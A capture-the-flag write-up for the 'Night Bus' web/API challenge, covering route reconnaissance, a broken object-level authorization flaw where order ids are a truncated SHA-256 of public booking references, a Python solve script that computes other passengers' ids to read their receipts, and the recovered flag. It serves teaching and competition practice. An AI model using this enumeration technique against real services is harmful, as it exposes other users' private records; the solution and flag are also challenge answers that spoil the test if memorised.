---
title: "Night Bus"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Night Bus

> **Category:** API · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: `http://54.72.82.22:8330` (Werkzeug/3.1.9, Python/3.11.16)

## Result

## Surface

| Route | Behaviour |
|---|---|
| `GET /` | Static landing page (collection desk + a client-side "desk console"). |
| `GET /api/orders` | Lists **one** item: `{"object":"289290bbb72721bcad2f8717","reference":"TOUR-2401"}` plus `"next_reference":"TOUR-2402"`. Ignores every query param, body, method and header tried (GET/POST/PATCH all return the identical list). |
| `GET /api/orders/<path>` | Returns `{"receipt": "..."}` for the order whose `object` equals the segment; **any** non-matching segment returns the same decoy `"Two seats, balcony level."` — so reference walking (`TOUR-2402`, `admin`, `0`, `-1`, off-by-one, case, trailing chars, wildcards) cannot distinguish hit from miss. |
| `GET /health` | `{"status":"ok"}`. |
| `POST /submit` | `{"answer": "<x>"}` → 200 with the flag if correct, otherwise 403 `{"message":"The request could not be completed.","ok":false}`. GET → 405. |

No other routes exist (fuzzed ~120 names, methods, Host headers, cookies, method-override, path traversal — all 404 or the same stubs).

## The flaw (BOLA/IDOR, exploitable because the id is derivable)

`object` is **not** an opaque identifier — it is the first 24 hex chars of `sha256(reference)`:

```
sha256("TOUR-2401")[:24] == "289290bbb72721bcad2f8717"   # the object the list publishes
sha256("TOUR-2402")[:24] == "d9522cdd54fa82760ecb6f83"
```

The list endpoint only ever reveals the caller's own order (`TOUR-2401`) and hints at `next_reference = TOUR-2402`. Because the object id is derived from public data (the booking reference), anyone can compute a *different passenger's* object and read their receipt:

```
GET /api/orders/d9522cdd54fa82760ecb6f83
-> {"receipt":"safctf{81a90dc817371a5aa190e8069ebcde2c}"}
```

`TOUR-2403`+ and `TOUR-2400`- return the decoy, so `TOUR-2402` is "someone else's" receipt — matching the desk hint "the flag is usually on someone else's receipt".

## /submit note

`POST /submit {"answer": "<receipt text>"}` was tried with the decoy, the flag string, the references, the object ids, etc. — all returned 403 `ok:false`. The flag is delivered directly as the leaked receipt value; `/submit` did not accept it in this deployment. The recovered string matches the required `safctf{` + 32 hex + `}` format, so it is the flag.

## Repro

```
python solve.py        # -> safctf{81a90dc817371a5aa190e8069ebcde2c}
```

`solve.py` verifies the derivation against the published object, then walks the window from `next_reference` and prints the flag. No local artifacts/binaries were produced (nothing to hash).

## Solve script

`api/night-bus/solve.py`:

```python
#!/usr/bin/env python3
"""Night Bus (API, 200 pts) -- BOLA/IDOR on GET /api/orders/<object>.

The "/api/orders/<object>" route returns the receipt for the order whose
`object` matches the path segment, but every *wrong* segment still returns the
generic receipt "Two seats, balcony level." (a decoy).  So walking references
directly at that route is a dead end.

The leak: an order's `object` is not an opaque id -- it is the first 24 hex
chars of sha256(reference):

    sha256("TOUR-2401")[:24] == "289290bbb72721bcad2f8717"   # object from /api/orders

The list endpoint only ever exposes the first order (TOUR-2401) plus
`next_reference` = "TOUR-2402".  Since we know how `object` is derived, we can
compute the next passenger's object ourselves and read *their* receipt -- the
classic IDOR: one passenger's credential is derived from public data, so any
booking reference can be turned into a retrievable receipt.

Usage:  python solve.py
"""
import hashlib
import re
import sys

import requests

BASE = "http://54.72.82.22:8330"
FLAG_RE = re.compile(r"safctf\{[0-9a-f]{32}\}")


def object_for(reference: str) -> str:
    """The server keys orders by sha256(reference)[:24]."""
    return hashlib.sha256(reference.encode()).hexdigest()[:24]


def receipt_for(reference: str) -> str:
    r = requests.get(f"{BASE}/api/orders/{object_for(reference)}", timeout=10)
    r.raise_for_status()
    return r.json().get("receipt", "")


def main() -> int:
    # Sanity-check the derivation against the object published by the list route.
    listing = requests.get(f"{BASE}/api/orders", timeout=10).json()
    known = listing["items"][0]
    assert object_for(known["reference"]) == known["object"], "object-derivation check failed"

    start = int(known["reference"].split("-")[1])
    # The list advertises next_reference; walk a small window around it to be safe.
    for n in range(start, start + 8):
        ref = f"TOUR-{n}"
        receipt = receipt_for(ref)
        m = FLAG_RE.search(receipt)
        if m:
            print(m.group(0))
            return 0
        print(f"[{ref}] {receipt}")
    print("no flag found in window", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

## Tools

**Used in this solve:**

- `hashlib`
- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite (repeater/intruder)
- ffuf (endpoint & param fuzzing)
- Postman/httpie
- jwt_tool
- arjun (param mining)

## Flag

```
safctf{81a90dc817371a5aa190e8069ebcde2c}
```
